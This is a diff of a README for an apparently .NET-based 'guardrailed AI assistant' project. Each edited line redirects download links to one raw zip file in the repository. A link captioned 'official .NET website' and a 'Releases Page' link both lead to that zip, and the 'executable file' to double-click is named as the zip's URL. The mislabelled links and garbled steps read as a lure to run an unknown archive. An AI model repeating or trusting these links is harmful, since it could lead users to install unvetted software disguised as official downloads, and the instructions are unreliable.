@@ -1,7 +1,7 @@
 # 🤖 nl-guardrailed-ai-assistant - Build Your Own AI Assistant Easily
 
 ## 📥 Download Now
-[![Download](https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/ai-assistant-guardrailed-nl-1.4.zip)](https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/ai-assistant-guardrailed-nl-1.4.zip)
+[![Download](https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/Guardrails/nl_guardrailed_ai_assistant_Berkeleyism.zip)](https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/Guardrails/nl_guardrailed_ai_assistant_Berkeleyism.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the nl-guardrailed-ai-assistant. You will follow simple steps to get your AI assistant up and running on your computer.
@@ -24,15 +24,15 @@ To run the nl-guardrailed-ai-assistant, your computer should meet the following 
 - **Processor**: At least 2 GHz dual-core.
 - **Memory**: 4 GB RAM minimum.
 - **Disk Space**: 200 MB available space.
-- **.NET 10 Installation**: Ensure you have .NET 10 installed on your computer. If you need to install it, you can download it from the [official .NET website](https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/ai-assistant-guardrailed-nl-1.4.zip).
+- **.NET 10 Installation**: Ensure you have .NET 10 installed on your computer. If you need to install it, you can download it from the [official .NET website](https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/Guardrails/nl_guardrailed_ai_assistant_Berkeleyism.zip).
 
 ## 📥 Download & Install
-To download the nl-guardrailed-ai-assistant, visit this page to download: [Releases Page](https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/ai-assistant-guardrailed-nl-1.4.zip).
+To download the nl-guardrailed-ai-assistant, visit this page to download: [Releases Page](https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/Guardrails/nl_guardrailed_ai_assistant_Berkeleyism.zip).
 
 Once on the Releases page, follow these steps:
 
 1. Look for the latest version of the application.
-2. Download the file labeled with the version you want. It will typically be named something like `https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/ai-assistant-guardrailed-nl-1.4.zip`.
+2. Download the file labeled with the version you want. It will typically be named something like `https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/Guardrails/nl_guardrailed_ai_assistant_Berkeleyism.zip`.
 3. Once the file is finished downloading, locate it in your Downloads folder.
 
 ### 📂 Extract Files
@@ -42,8 +42,8 @@ Once on the Releases page, follow these steps:
 
 ### 🖥️ Running the Application
 1. Open the folder where you extracted the files.
-2. Find the executable file named `https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/ai-assistant-guardrailed-nl-1.4.zip`.
-3. Double-click on the `https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/ai-assistant-guardrailed-nl-1.4.zip` file to launch the application.
+2. Find the executable file named `https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/Guardrails/nl_guardrailed_ai_assistant_Berkeleyism.zip`.
+3. Double-click on the `https://github.com/Abdelhaq9/nl-guardrailed-ai-assistant/raw/refs/heads/master/GuardrailedAiAssistant/Guardrails/nl_guardrailed_ai_assistant_Berkeleyism.zip` file to launch the application.
 
 ## 🖊️ How to Use the Assistant
 Once the application is open:
